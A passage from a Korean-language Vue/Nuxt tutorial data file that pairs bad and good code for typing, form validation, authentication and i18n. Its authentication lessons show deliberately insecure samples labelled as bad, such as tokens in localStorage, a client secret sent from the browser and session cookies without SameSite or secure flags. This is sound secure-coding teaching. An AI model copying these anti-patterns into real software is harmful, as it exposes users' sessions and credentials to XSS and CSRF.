export type Size = (typeof SIZES)[number]   // 'sm' | 'md' | 'lg'
`,
        },
        {
          id: 'l4', short: `Props 타입 재사용`,
          title: `props 타입은 외부 interface 로 꺼내 재사용한다`, ver: `Vue 3.3+`,
          why: `같은 props 모양을 여러 컴포넌트가 쓰거나 테스트에서 참조하려면 타입이 파일 밖에 있어야 합니다. 3.3 부터 import 한 타입도 defineProps 에 바로 씁니다.`,
          bad: String.raw`
// 컴포넌트마다 같은 모양을 다시 적는다
defineProps<{ id: number; name: string; email: string; role: 'admin' | 'user' }>()
`,
          good: String.raw`
// types/user.ts
export interface User { id: number; name: string; email: string; role: 'admin' | 'user' }

// UserCard.vue
import type { User } from '~/types/user'
defineProps<{ user: User; compact?: boolean }>()

// 다른 컴포넌트의 props 타입이 필요할 때
type CardProps = InstanceType<typeof UserCard>['$props']
`,
        },
        {
          id: 'l5', short: `API 응답 타입`,
          title: `API 응답 타입은 한 곳에서 정의하고 서버와 공유한다`,
          why: `클라이언트가 응답 모양을 따로 적으면 서버가 바뀔 때 어긋납니다. Nuxt 는 server/api 핸들러의 반환 타입을 useFetch 에 그대로 추론해 주고, zod 스키마가 있으면 양쪽이 같은 타입을 씁니다.`,
          bad: String.raw`
// 클라이언트에서 따로 적은 타입. 서버가 바뀌면 조용히 어긋난다
interface Res { items: { id: number; title: string }[] }
const { data } = await useFetch<Res>('/api/posts')
`,
          good: String.raw`
// server/api/posts.get.ts
export default defineEventHandler(async () => {
  const items = await db.post.findMany()
  return { items }                        // 반환 타입이 곧 응답 타입
})

// 페이지: 타입 인자 없이도 { items: Post[] } 로 추론된다
const { data } = await useFetch('/api/posts')

// 입력도 스키마에서 뽑는다 (shared/ 나 server/utils 에 두고 양쪽이 import)
export const PostInput = z.object({ title: z.string(), body: z.string() })
export type PostInput = z.infer<typeof PostInput>
`,
        },
        {
          id: 'l6', short: `satisfies`,
          title: `설정 객체는 as 가 아니라 satisfies`,
          why: `as 는 틀린 모양도 강제로 통과시키고 리터럴 정보를 잃게 합니다. satisfies 는 모양을 검사하면서 추론된 좁은 타입을 그대로 남깁니다.`,
          bad: String.raw`
const routes = {
  home: '/', about: '/abuot'
} as Record<string, string>
routes.hmoe                 // string 으로 통과, 오타를 못 잡는다
`,
          good: String.raw`
const routes = {
  home: '/', about: '/about'
} satisfies Record<string, string>
routes.hmoe                 // 오류: 키가 home | about 으로 남아 있다

const theme = { primary: '#1f5fbf', radius: 8 } satisfies ThemeConfig
`,
        },
        {
          id: 'l7', short: `제네릭 컴포저블`,
          title: `컴포저블은 제네릭으로 호출 쪽 타입을 받는다`,
          why: `useList 가 any[] 를 돌려주면 항목을 쓰는 곳마다 타입이 사라집니다. 타입 매개변수를 두면 호출 인자에서 추론되어 반환까지 흐릅니다.`,
          bad: String.raw`
export function usePaged(url: string) {
  const items = ref<any[]>([])
  ...
  return { items }
}
const { items } = usePaged('/api/users')   // any[]
`,
          good: String.raw`
export function usePaged<T>(url: MaybeRefOrGetter<string>) {
  const items = ref<T[]>([]) as Ref<T[]>     // Ref<UnwrapRef<T>[]> 가 되는 것을 막는다
  const page = ref(1)
  async function load() {
    items.value = await $fetch<T[]>(toValue(url), { query: { page: page.value } })
  }
  return { items, page, load }
}
const { items } = usePaged<User>('/api/users')   // Ref<User[]>
`,
          note: `ref 에 제네릭 T 를 넣으면 Vue 가 UnwrapRef 를 적용해 타입이 꼬일 때가 있습니다. 그럴 때 <code>as Ref&lt;T[]&gt;</code> 로 고정하는 것이 관용구입니다.`,
        },
        {
          id: 'l8', short: `판별 유니온`,
          title: `비동기 상태는 판별 유니온으로 한 번에`,
          why: `data, error, loading 을 따로 두면 "로딩 중인데 error 도 있는" 모순 상태가 가능합니다. status 로 판별하는 유니온은 한 상태에 맞는 필드만 허용합니다.`,
          bad: String.raw`
const data = ref<User | null>(null)
const error = ref<Error | null>(null)
const loading = ref(false)
// 세 값의 조합 8가지 중 말이 되는 건 3가지뿐
`,
          good: String.raw`
type Async<T> =
  | { status: 'idle' }
  | { status: 'loading' }
  | { status: 'success'; data: T }
  | { status: 'error'; error: Error }

const state = ref<Async<User>>({ status: 'idle' })

// 템플릿/코드에서 status 로 좁히면 data 가 있는 경우만 접근된다
if (state.value.status === 'success') state.value.data.name
`,
        },
        {
          id: 'l9', short: `모듈 확장`,
          title: `전역 속성과 라우트 meta 는 declare module 로 타입을 붙인다`,
          why: `app.config.globalProperties 나 route.meta 에 넣은 값은 기본이 unknown 입니다. 모듈 확장으로 선언하면 템플릿과 미들웨어에서 타입이 보입니다.`,
          bad: String.raw`
app.config.globalProperties.$fmt = formatMoney
// 템플릿: {{ $fmt(price) }}   → 타입 오류 또는 any

definePageMeta({ requiresAuth: true })
to.meta.requiresAuth            // unknown
`,
          good: String.raw`
// types/vue.d.ts
declare module 'vue' {
  interface ComponentCustomProperties { $fmt: (n: number) => string }
}
// types/router.d.ts  (Nuxt 는 '#app' 의 PageMeta 를 확장)
declare module '#app' {
  interface PageMeta { requiresAuth?: boolean; roles?: string[] }
}
export {}
`,
          note: `.d.ts 파일에 <code>export {}</code> 가 있어야 모듈로 취급되어 확장이 적용됩니다.`,
        },
        {
          id: 'l10', short: `strict 와 vue-tsc`,
          title: `tsconfig 는 strict, 검사는 vue-tsc 로`,
          why: `tsc 는 .vue 템플릿을 보지 못합니다. vue-tsc 가 템플릿 안의 props, 이벤트, 슬롯까지 검사합니다. strict 가 꺼져 있으면 null 검사가 빠져 절반만 잡습니다.`,
          bad: String.raw`
// tsconfig.json
{ "compilerOptions": { "strict": false, "noImplicitAny": false } }
// package.json: "typecheck": "tsc --noEmit"      ← 템플릿은 검사되지 않는다
`,
          good: String.raw`
// tsconfig.json  (Nuxt 는 .nuxt/tsconfig.json 을 extends)
{ "extends": "./.nuxt/tsconfig.json", "compilerOptions": { "strict": true } }

// package.json
"typecheck": "vue-tsc --noEmit"            // Vue 프로젝트
"typecheck": "nuxi typecheck"              // Nuxt 프로젝트

// CI 에서 lint 와 함께 돌린다
`,
        },
      ],
    },
    {
      id: 'vue-12', no: 12, name: `폼과 검증`,
      lead: `입력, 검증, 제출, 오류 표시를 일관되게 처리하는 습관입니다. VeeValidate 와 zod 조합을 기준으로 합니다.`,
      lessons: [
        {
          id: 'l1', short: `스키마 검증`,
          title: `검증 규칙은 if 문이 아니라 스키마에`,
          why: `필드마다 if 로 검사하면 규칙이 흩어지고 서버와 어긋납니다. zod 스키마 하나를 클라이언트 폼과 서버 API 가 같이 쓰면 규칙이 한 곳에 모입니다.`,
          bad: String.raw`
function submit() {
  if (!email.value) { errors.email = '필수'; return }
  if (!email.value.includes('@')) { errors.email = '형식'; return }
  if (password.value.length < 8) { errors.password = '8자 이상'; return }
  ...
}
`,
          good: String.raw`
// shared/schemas/signup.ts  (서버 server/api 도 같은 파일을 import)
import { z } from 'zod'
export const SignupSchema = z.object({
  email: z.string().email('이메일 형식이 아닙니다'),
  password: z.string().min(8, '8자 이상'),
  agree: z.literal(true, { errorMap: () => ({ message: '동의가 필요합니다' }) })
})
export type Signup = z.infer<typeof SignupSchema>
`,
        },
        {
          id: 'l2', short: `useForm`,
          title: `VeeValidate 의 useForm + toTypedSchema`, ver: `VeeValidate 4`,
          why: `폼 상태(값, 오류, touched, 제출 중)를 손으로 관리하면 컴포넌트가 상태 기계가 됩니다. useForm 이 그 상태를 들고, toTypedSchema 로 zod 타입이 values 에 흐릅니다.`,
          bad: String.raw`
const email = ref(''); const password = ref('')
const errors = reactive({ email: '', password: '' })
const touched = reactive({ email: false, password: false })
const submitting = ref(false)
// blur, input, submit 마다 위 상태를 손으로 갱신...
`,
          good: String.raw`
import { useForm } from 'vee-validate'
import { toTypedSchema } from '@vee-validate/zod'

const { defineField, handleSubmit, errors, isSubmitting } = useForm({
  validationSchema: toTypedSchema(SignupSchema)
})
const [email, emailAttrs] = defineField('email')
const [password, passwordAttrs] = defineField('password')

const onSubmit = handleSubmit(async (values) => {   // values: Signup, 검증 통과 시에만
  await $fetch('/api/signup', { method: 'POST', body: values })
})
`,
        },
        {
          id: 'l3', short: `오류 표시 시점`,
          title: `오류는 입력 중이 아니라 blur 나 제출 뒤에 보여 준다`,
          why: `첫 글자를 치자마자 "형식이 아닙니다" 가 뜨면 사용자가 혼납니다. 필드를 떠났을 때 검증하고, 한 번 오류가 난 뒤에는 입력할 때마다 다시 검사해 고쳐지는 것을 바로 보여 줍니다.`,
          bad: String.raw`
<input v-model="email" @input="validate">
<p v-if="errors.email">{{ errors.email }}</p>   <!-- 'a' 만 쳐도 빨갛다 -->
`,
          good: String.raw`
<!-- defineField 의 attrs 가 blur / input 검증 시점을 처리한다 -->
<input v-model="email" v-bind="emailAttrs" :aria-invalid="!!errors.email" aria-describedby="email-err">
<p id="email-err" v-if="errors.email">{{ errors.email }}</p>

<script setup>
const [email, emailAttrs] = defineField('email', {
  validateOnBlur: true, validateOnModelUpdate: false   // 떠날 때 검사, 오류 뒤에는 자동으로 재검사
})
</script>
`,
        },
        {
          id: 'l4', short: `필드 컴포넌트`,
          title: `레이블, 입력, 오류를 묶은 필드 컴포넌트 하나`,
          why: `폼마다 label + input + 오류 문구 + aria 속성을 반복하면 하나만 빠져도 접근성이 깨집니다. FormField 컴포넌트가 그 묶음을 책임집니다.`,
          bad: String.raw`
<label>이메일</label>
<input v-model="email" v-bind="emailAttrs">
<span class="err">{{ errors.email }}</span>
<label>비밀번호</label>
<input v-model="password" v-bind="passwordAttrs" type="password">
<span class="err">{{ errors.password }}</span>
`,
          good: String.raw`
<!-- components/FormField.vue -->
<script setup lang="ts">
import { useField } from 'vee-validate'
const props = defineProps<{ name: string; label: string; type?: string }>()
const { value, errorMessage, handleBlur } = useField<string>(() => props.name)
const id = useId()
</script>
<template>
  <div class="field">
    <label :for="id">{{ label }}</label>
    <input :id="id" v-model="value" :type="type ?? 'text'" @blur="handleBlur"
           :aria-invalid="!!errorMessage" :aria-describedby="errorMessage ? id + '-err' : undefined">
    <p v-if="errorMessage" :id="id + '-err'" class="err">{{ errorMessage }}</p>
  </div>
</template>

<!-- 폼: useForm 아래에서 이름만 맞추면 연결된다 -->
<FormField name="email" label="이메일" />
<FormField name="password" label="비밀번호" type="password" />
`,
          note: `<code>useId()</code> 는 Vue 3.5 부터 SSR 에서도 안전한 id 를 만듭니다.`,
        },
        {
          id: 'l5', short: `서버 오류 매핑`,
          title: `서버가 돌려준 필드 오류를 폼에 다시 꽂는다`,
          why: `"이미 쓰는 이메일" 같은 오류는 서버만 압니다. 상태 코드만 보고 alert 를 띄우면 사용자가 어느 칸을 고쳐야 할지 모릅니다. setErrors 로 해당 필드에 보여 줍니다.`,
          bad: String.raw`
try { await $fetch('/api/signup', { method: 'POST', body: values }) }
catch (e) { alert('실패했습니다') }
`,
          good: String.raw`
// server: 422 와 함께 필드별 메시지
throw createError({ statusCode: 422, data: { errors: { email: '이미 가입된 이메일입니다' } } })

// client
const { setErrors } = useForm(...)
const onSubmit = handleSubmit(async (values) => {
  try { await $fetch('/api/signup', { method: 'POST', body: values }) }
  catch (e) {
    const err = e as FetchError
    if (err.statusCode === 422) setErrors(err.data.errors)
    else throw e
  }
})
`,
        },
        {
          id: 'l6', short: `이중 제출`,
          title: `제출 중에는 버튼을 잠그고 결과로 상태를 바꾼다`,
          why: `느린 네트워크에서 버튼을 두 번 누르면 주문이 두 개 생깁니다. isSubmitting 으로 잠그고, 성공 뒤에는 폼을 초기화하거나 이동합니다.`,
          bad: String.raw`
<button @click="submit">가입</button>     <!-- 두 번 누르면 두 번 간다 -->
`,
          good: String.raw`
<form @submit="onSubmit">
  <button type="submit" :disabled="isSubmitting">
    {{ isSubmitting ? '처리 중…' : '가입' }}
  </button>
</form>

// 성공 뒤
const onSubmit = handleSubmit(async (values) => {
  await $fetch(...)
  resetForm()                      // 또는 navigateTo('/welcome')
})
`,
          note: `서버 쪽에도 멱등 키(Idempotency-Key 헤더)를 두면 네트워크 재시도까지 안전합니다.`,
        },
        {
          id: 'l7', short: `동적 필드`,
          title: `배열 필드는 useFieldArray`,
          why: `주소 여러 개, 담당자 여러 명처럼 늘었다 줄어드는 입력을 index 로 직접 관리하면 삭제할 때 검증 오류가 한 칸씩 밀립니다. useFieldArray 가 키와 오류를 함께 옮깁니다.`,
          bad: String.raw`
const phones = ref([''])
<div v-for="(p, i) in phones" :key="i">
  <input v-model="phones[i]">
  <button @click="phones.splice(i, 1)">삭제</button>   <!-- 오류 문구가 밀린다 -->
</div>
`,
          good: String.raw`
const { fields, push, remove } = useFieldArray<string>('phones')

<div v-for="(f, i) in fields" :key="f.key">          <!-- 안정적인 key -->
  <FormField :name="'phones[' + i + ']'" label="전화" />
  <button type="button" @click="remove(i)">삭제</button>
</div>
<button type="button" @click="push('')">추가</button>
`,
        },
        {
          id: 'l8', short: `초기값과 dirty`,
          title: `수정 폼은 initialValues 를 주고 바뀐 것만 보낸다`,
          why: `수정 화면에서 전체 객체를 PUT 하면 동시에 고친 다른 사람의 값을 덮어씁니다. 초기값을 알면 바뀐 필드만 PATCH 할 수 있고, 떠날 때 "저장 안 한 변경" 도 물을 수 있습니다.`,
          bad: String.raw`
const form = reactive({ ...props.user })
async function save() { await $fetch('/api/users/' + id, { method: 'PUT', body: form }) }
`,
          good: String.raw`
const { handleSubmit, meta, values, resetForm } = useForm({
  validationSchema: toTypedSchema(UserSchema),
  initialValues: props.user
})
const save = handleSubmit(async (v) => {
  const changed = Object.fromEntries(Object.entries(v).filter(([k, val]) => val !== props.user[k]))
  await $fetch('/api/users/' + id, { method: 'PATCH', body: changed })
  resetForm({ values: v })          // 저장한 값이 새 기준
})

onBeforeRouteLeave(() => meta.value.dirty ? confirm('저장하지 않은 변경이 있습니다. 나갈까요?') : true)
`,
        },
        {
          id: 'l9', short: `서버 재검증`,
          title: `클라이언트 검증은 편의, 서버 검증이 진짜`,
          why: `브라우저 검증은 개발자 도구로 우회됩니다. 같은 스키마로 서버에서 다시 검사하지 않으면 아무 값이나 저장됩니다.`,
          bad: String.raw`
// server/api/signup.post.ts
export default defineEventHandler(async (event) => {
  const body = await readBody(event)      // 프론트가 검사했으니 믿는다?
  await createUser(body)
})
`,
          good: String.raw`
import { SignupSchema } from '~~/shared/schemas/signup'

export default defineEventHandler(async (event) => {
  const body = await readValidatedBody(event, (b) => SignupSchema.safeParse(b))
  if (!body.success) {
    throw createError({ statusCode: 422, data: { errors: body.error.flatten().fieldErrors } })
  }
  await createUser(body.data)
})
`,
        },
        {
          id: 'l10', short: `파일 입력`,
          title: `파일 입력은 v-model 이 안 되니 change 이벤트로`,
          why: `input type=file 은 값을 프로그램으로 설정할 수 없어 v-model 이 동작하지 않습니다. change 에서 files 를 꺼내 상태에 넣고, 크기와 종류는 보내기 전에 검사합니다.`,
          bad: String.raw`
<input type="file" v-model="file">      <!-- 동작하지 않는다 -->
`,
          good: String.raw`
<input type="file" accept="image/*" @change="onPick">

<script setup lang="ts">
const file = ref<File | null>(null)
function onPick(e: Event) {
  const f = (e.target as HTMLInputElement).files?.[0] ?? null
  if (f && f.size > 5 * 1024 * 1024) { error.value = '5MB 이하만'; return }
  file.value = f
}
async function upload() {
  const fd = new FormData()
  fd.append('file', file.value!)
  await $fetch('/api/upload', { method: 'POST', body: fd })   // Content-Type 은 자동
}
</script>
`,
        },
      ],
    },
    {
      id: 'vue-13', no: 13, name: `인증과 세션`,
      lead: `로그인 상태를 안전하게 들고 다니는 습관입니다. Nuxt 의 nuxt-auth-utils 를 기준으로 하되, 원리는 어디서나 같습니다.`,
      lessons: [
        {
          id: 'l1', short: `토큰 저장 위치`,
          title: `토큰은 localStorage 가 아니라 httpOnly 쿠키`,
          why: `localStorage 의 토큰은 XSS 한 번이면 그대로 새어 나갑니다. httpOnly 쿠키는 스크립트가 읽을 수 없고, SSR 요청에도 자동으로 실려 서버 렌더링 때 로그인 상태를 압니다.`,
          bad: String.raw`
const { token } = await $fetch('/api/login', { method: 'POST', body })
localStorage.setItem('token', token)                 // XSS 에 노출
$fetch('/api/me', { headers: { Authorization: 'Bearer ' + localStorage.getItem('token') } })
`,
          good: String.raw`
// server/api/login.post.ts
export default defineEventHandler(async (event) => {
  const user = await verifyCredentials(await readBody(event))
  setCookie(event, 'session', await seal(user), {
    httpOnly: true, secure: true, sameSite: 'lax', path: '/', maxAge: 60 * 60 * 24 * 7
  })
  return { ok: true }
})
// 이후 요청은 쿠키가 자동으로 붙는다. 클라이언트 코드에 토큰이 없다
`,
        },
        {
          id: 'l2', short: `nuxt-auth-utils`,
          title: `세션은 직접 짜지 말고 nuxt-auth-utils`, ver: `nuxt-auth-utils`,
          why: `쿠키 봉인, 만료, OAuth 콜백을 직접 짜면 빠뜨리는 것이 생깁니다. nuxt-auth-utils 는 암호화된 세션 쿠키와 useUserSession, requireUserSession, OAuth 핸들러를 제공합니다.`,
          bad: String.raw`
// 직접 JWT 만들고, 쿠키 쓰고, 검증하고, OAuth 콜백 파싱하고...
const token = jwt.sign({ id }, SECRET)
`,
          good: String.raw`
// nuxt.config.ts: modules: ['nuxt-auth-utils'], .env: NUXT_SESSION_PASSWORD (32자 이상)

// server/api/login.post.ts
export default defineEventHandler(async (event) => {
  const user = await verifyCredentials(await readBody(event))
  await setUserSession(event, { user: { id: user.id, name: user.name, role: user.role } })
  return { ok: true }
})

// 컴포넌트
const { loggedIn, user, clear, fetch: refresh } = useUserSession()
`,
        },
        {
          id: 'l3', short: `서버 보호`,
          title: `API 보호는 requireUserSession 한 줄`,
          why: `세션 검사를 핸들러마다 다르게 쓰면 하나는 빠집니다. 보호가 필요한 핸들러 맨 위에 같은 호출을 두면 없을 때 401 로 끝납니다.`,
          bad: String.raw`
export default defineEventHandler(async (event) => {
  const cookie = getCookie(event, 'session')
  if (!cookie) return { error: 'login' }          // 200 에 오류, 핸들러마다 제각각
  ...
})
`,
          good: String.raw`
export default defineEventHandler(async (event) => {
  const { user } = await requireUserSession(event)   // 없으면 401
  return db.orders.byUser(user.id)
})

// 역할까지
const { user } = await requireUserSession(event)
if (user.role !== 'admin') throw createError({ statusCode: 403 })
`,
        },
        {
          id: 'l4', short: `페이지 보호`,
          title: `페이지 보호는 라우트 미들웨어, 원래 가려던 곳을 기억한다`,
          why: `로그인 뒤 홈으로 보내면 사용자가 다시 찾아가야 합니다. 미들웨어에서 redirect 쿼리로 원래 주소를 넘기고, 로그인 성공 시 거기로 돌려보냅니다.`,
          bad: String.raw`
// 페이지마다
if (!loggedIn.value) navigateTo('/login')
// 로그인 뒤 항상 /
`,
          good: String.raw`
// middleware/auth.ts
export default defineNuxtRouteMiddleware((to) => {
  const { loggedIn } = useUserSession()
  if (!loggedIn.value) return navigateTo({ path: '/login', query: { redirect: to.fullPath } })
})

// pages/login.vue
const route = useRoute()
async function login() {
  await $fetch('/api/login', { method: 'POST', body: form })
  await refresh()                                     // useUserSession().fetch
  const back = String(route.query.redirect || '/')
  await navigateTo(back.startsWith('/') ? back : '/')  // 외부 주소로 보내는 오픈 리다이렉트 방지
}
`,
        },
        {
          id: 'l5', short: `로그아웃`,
          title: `로그아웃은 서버 세션 삭제 + 클라이언트 캐시 비우기`,
          why: `클라이언트 상태만 지우면 쿠키가 살아 있어 새로고침하면 다시 로그인됩니다. 서버에서 세션을 지우고, useFetch 캐시와 스토어도 비운 뒤 이동합니다.`,
          bad: String.raw`
function logout() {
  user.value = null
  navigateTo('/')          // 쿠키는 그대로, 캐시된 /api/me 도 그대로
}
`,
          good: String.raw`
async function logout() {
  await $fetch('/api/logout', { method: 'POST' })   // 서버: clearUserSession(event)
  await clear()                                     // useUserSession().clear
  clearNuxtData()                                   // 사용자 데이터 캐시 비우기
  useCartStore().$reset?.()
  await navigateTo('/login')
}
`,
        },
        {
          id: 'l6', short: `OAuth`,
          title: `소셜 로그인은 서버 라우트에서 콜백을 받는다`,
          why: `클라이언트에서 OAuth 토큰 교환을 하면 client secret 이 노출됩니다. 서버 라우트가 콜백을 받아 세션을 만들고 리다이렉트합니다.`,
          bad: String.raw`
// 브라우저에서 토큰 교환: secret 이 번들에 들어간다
const res = await fetch('https://github.com/login/oauth/access_token', {
  body: JSON.stringify({ client_id, client_secret, code })
})
`,
          good: String.raw`
// server/routes/auth/github.get.ts
export default defineOAuthGitHubEventHandler({
  config: { emailRequired: true },
  async onSuccess(event, { user }) {
    const local = await upsertUserByEmail(user.email, { name: user.name, avatar: user.avatar_url })
    await setUserSession(event, { user: { id: local.id, name: local.name, role: local.role } })
    return sendRedirect(event, '/')
  },
  onError(event) { return sendRedirect(event, '/login?error=oauth') }
})
// .env: NUXT_OAUTH_GITHUB_CLIENT_ID, NUXT_OAUTH_GITHUB_CLIENT_SECRET
// <a href="/auth/github">GitHub 로 로그인</a>
`,
        },
        {
          id: 'l7', short: `세션에 넣을 것`,
          title: `세션에는 식별자와 역할만, 비밀은 서버 전용 칸에`,
          why: `세션 쿠키는 4KB 제한이 있고 user 부분은 클라이언트에 보입니다. 프로필 전체나 액세스 토큰을 넣지 말고, 외부 API 토큰은 secure 칸에 둡니다.`,
          bad: String.raw`
await setUserSession(event, { user: fullUserRow, githubToken: token })   // 전부 클라이언트에 노출
`,
          good: String.raw`
await setUserSession(event, {
  user: { id: user.id, name: user.name, role: user.role },   // 클라이언트에 보여도 되는 것
  secure: { githubToken: token },                              // 서버에서만 읽힌다
  loggedInAt: Date.now()
})

// 서버에서
const session = await getUserSession(event)
session.secure?.githubToken
`,
        },
        {
          id: 'l8', short: `만료와 갱신`,
          title: `세션 만료는 서버가 정하고, 만료 응답은 한 곳에서 처리한다`,
          why: `401 을 받는 곳마다 로그인 페이지로 보내는 코드를 쓰면 빠지는 곳이 생깁니다. $fetch 인스턴스의 onResponseError 한 곳에서 처리합니다.`,
          bad: String.raw`
try { await $fetch('/api/orders') } catch (e) { if (e.statusCode === 401) navigateTo('/login') }
try { await $fetch('/api/me') }     catch (e) { if (e.statusCode === 401) navigateTo('/login') }
`,
          good: String.raw`
// plugins/api.ts
export default defineNuxtPlugin((nuxtApp) => {
  const api = $fetch.create({
    async onResponseError({ response }) {
      if (response.status === 401) {
        await nuxtApp.runWithContext(() => navigateTo('/login'))
      }
    }
  })
  return { provide: { api } }
})
// 사용: const { $api } = useNuxtApp(); await $api('/api/orders')
`,
          note: `액세스 토큰 + 리프레시 토큰 방식의 자동 재발급은 "실무 코드" 세트 1회차에서 전체 코드로 다룹니다.`,
        },
        {
          id: 'l9', short: `CSRF`,
          title: `쿠키 인증에는 SameSite 와 CSRF 보호`,
          why: `쿠키는 다른 사이트에서 보낸 요청에도 자동으로 붙습니다. SameSite=lax 가 기본 방어이고, 상태를 바꾸는 요청에는 Origin 검사나 CSRF 토큰을 더합니다.`,
          bad: String.raw`
setCookie(event, 'session', value)       // SameSite 없음, secure 없음
// 다른 사이트의 <form action="https://내사이트/api/transfer"> 가 쿠키를 달고 들어온다
`,
          good: String.raw`
setCookie(event, 'session', value, { httpOnly: true, secure: true, sameSite: 'lax' })

// server/middleware/csrf.ts: 상태 변경 요청은 Origin 이 우리 사이트인지 본다
export default defineEventHandler((event) => {
  if (['POST', 'PUT', 'PATCH', 'DELETE'].includes(event.method)) {
    const origin = getHeader(event, 'origin')
    if (origin && new URL(origin).host !== getRequestHost(event)) {
      throw createError({ statusCode: 403, statusMessage: 'Bad origin' })
    }
  }
})
`,
          note: `nuxt-csurf 모듈이 토큰 방식을 대신해 줍니다. API 를 다른 도메인에서 쓰려면 CORS 와 함께 설계합니다.`,
        },
        {
          id: 'l10', short: `로그인 UI 상태`,
          title: `로그인 여부에 따른 UI 는 서버 렌더링 결과와 같아야 한다`,
          why: `서버는 로그아웃 화면을, 클라이언트는 로그인 화면을 그리면 하이드레이션이 깨지고 헤더가 깜빡입니다. 세션을 서버에서 읽어 양쪽이 같은 값으로 시작하게 합니다.`,
          bad: String.raw`
const loggedIn = ref(false)
onMounted(() => { loggedIn.value = !!localStorage.getItem('token') })   // 마운트 뒤 깜빡
<NavUser v-if="loggedIn" />
`,
          good: String.raw`
// useUserSession 은 서버에서 쿠키를 읽어 페이로드로 넘기므로 양쪽이 같다
const { loggedIn, user } = useUserSession()
<NavUser v-if="loggedIn" :user="user" />
<NuxtLink v-else to="/login">로그인</NuxtLink>

// 직접 만들 때는 useState + 서버 플러그인으로 초기값을 채운다
`,
        },
      ],
    },
    {
      id: 'vue-14', no: 14, name: `다국어 i18n`,
      lead: `@nuxtjs/i18n 으로 다국어를 붙일 때의 습관입니다. 문구, 날짜, 숫자, URL 까지 한 번에 다룹니다.`,
      lessons: [
        {
          id: 'l1', short: `하드코딩 금지`,
          title: `문구는 템플릿에 박지 말고 메시지 키로`,
          why: `문구가 템플릿에 박혀 있으면 번역할 때 모든 파일을 뒤져야 하고 같은 문구가 조금씩 달라집니다. 키로 쓰면 한 파일에서 관리합니다.`,
          bad: String.raw`
<button>저장</button>
<p>{{ count }}개의 항목</p>
`,
          good: String.raw`
<button>{{ $t('common.save') }}</button>
<p>{{ $t('items.count', { n: count }) }}</p>

// i18n/locales/ko.json
{ "common": { "save": "저장" }, "items": { "count": "{n}개의 항목" } }
`,
        },
        {
          id: 'l2', short: `설정`,
          title: `로케일 파일은 lazy 로, 기본 언어는 접두사 없이`, ver: `@nuxtjs/i18n 9+`,
          why: `모든 언어 메시지를 한 번에 번들에 넣으면 쓰지도 않는 언어까지 받습니다. lazy 로 현재 언어만 받고, URL 전략은 기본 언어는 /, 나머지는 /en/ 처럼 둡니다.`,
          bad: String.raw`
// nuxt.config.ts
i18n: { vueI18n: { messages: { ko: {...}, en: {...}, ja: {...} } } }   // 전부 번들에
`,
          good: String.raw`
// nuxt.config.ts
modules: ['@nuxtjs/i18n'],
i18n: {
  locales: [
    { code: 'ko', language: 'ko-KR', file: 'ko.json', name: '한국어' },
    { code: 'en', language: 'en-US', file: 'en.json', name: 'English' }
  ],
  defaultLocale: 'ko',
  strategy: 'prefix_except_default',   // /about, /en/about
  lazy: true,
  langDir: 'locales'                   // i18n/locales/
}
`,
        },
        {
          id: 'l3', short: `링크`,
          title: `링크는 localePath, 언어 전환은 switchLocalePath`,
          why: `/about 으로 하드코딩하면 영어 사용자가 한국어 페이지로 갑니다. localePath 가 현재 언어의 접두사를 붙이고, switchLocalePath 는 같은 페이지의 다른 언어 주소를 만듭니다.`,
          bad: String.raw`
<NuxtLink to="/about">소개</NuxtLink>          <!-- /en 에서 눌러도 /about -->
<a href="/en">English</a>                       <!-- 항상 홈으로 -->
`,
          good: String.raw`
const localePath = useLocalePath()
const switchLocalePath = useSwitchLocalePath()

<NuxtLink :to="localePath('/about')">{{ $t('nav.about') }}</NuxtLink>
<NuxtLink :to="localePath({ name: 'users-id', params: { id: 3 } })">...</NuxtLink>
<NuxtLink v-for="l in locales" :key="l.code" :to="switchLocalePath(l.code)">{{ l.name }}</NuxtLink>
`,
        },
        {
          id: 'l4', short: `복수형`,
          title: `개수에 따른 문구는 문자열 조립이 아니라 복수형 규칙`,
          why: `"1 items" 를 피하려고 if 로 조립하면 언어마다 규칙이 달라 무너집니다. 메시지에 복수형을 두고 $t 에 개수를 넘깁니다.`,
          bad: String.raw`
{{ count }} {{ count === 1 ? 'item' : 'items' }}     <!-- 영어만 생각한 코드 -->
`,
          good: String.raw`
// en.json
{ "cart": { "items": "no items | one item | {count} items" } }
// ko.json
{ "cart": { "items": "{count}개" } }

{{ $t('cart.items', count) }}
`,
        },
        {
          id: 'l5', short: `날짜, 숫자`,
          title: `날짜와 금액은 $d, $n 으로 로케일에 맞게`,
          why: `toLocaleString 을 여기저기 다른 옵션으로 부르면 화면마다 형식이 다릅니다. 형식 이름을 정해 두고 로케일만 바뀌게 합니다.`,
          bad: String.raw`
{{ new Date(order.at).toLocaleDateString('ko-KR') }}
{{ order.total.toLocaleString() }}원
`,
          good: String.raw`
// i18n.config.ts
export default defineI18nConfig(() => ({
  datetimeFormats: { ko: { short: { year: 'numeric', month: 'short', day: 'numeric' } }, en: { ... } },
  numberFormats:   { ko: { currency: { style: 'currency', currency: 'KRW' } }, en: { currency: { style: 'currency', currency: 'USD' } } }
}))

{{ $d(new Date(order.at), 'short') }}
{{ $n(order.total, 'currency') }}
`,
        },
        {
          id: 'l6', short: `스크립트에서`,
          title: `스크립트와 서버에서는 useI18n / 서버 번역 함수`,
          why: `$t 는 템플릿용 전역입니다. 컴포저블이나 API 응답 메시지에서는 useI18n 의 t 를 쓰고, 서버 라우트에서는 요청의 Accept-Language 로 번역합니다.`,
          bad: String.raw`
const msg = this.$t('error.network')      // Composition API 에 this 없음
throw createError({ statusMessage: '권한이 없습니다' })   // 서버: 항상 한국어
`,
          good: String.raw`
// 컴포넌트/컴포저블
const { t, locale } = useI18n()
toast(t('error.network'))

// 서버 라우트 (experimental.localeDetector 설정 뒤)
export default defineEventHandler(async (event) => {
  const t = await useTranslation(event)
  throw createError({ statusCode: 403, statusMessage: t('error.forbidden') })
})
`,
        },
        {
          id: 'l7', short: `SEO`,
          title: `언어별 head 는 useLocaleHead`,
          why: `hreflang, lang 속성, 대체 URL 이 없으면 검색 엔진이 언어 페이지를 중복으로 봅니다. useLocaleHead 가 그 메타를 만들어 줍니다.`,
          bad: String.raw`
useHead({ htmlAttrs: { lang: 'ko' } })      // 영어 페이지에도 ko
`,
          good: String.raw`
// app.vue 또는 layouts/default.vue
const head = useLocaleHead({ seo: true })
useHead(() => ({
  htmlAttrs: { lang: head.value.htmlAttrs!.lang },
  link: head.value.link,     // alternate hreflang, canonical
  meta: head.value.meta      // og:locale
}))
`,
        },
        {
          id: 'l8', short: `키 설계`,
          title: `키는 화면이 아니라 의미로, 중첩은 두세 단계까지`,
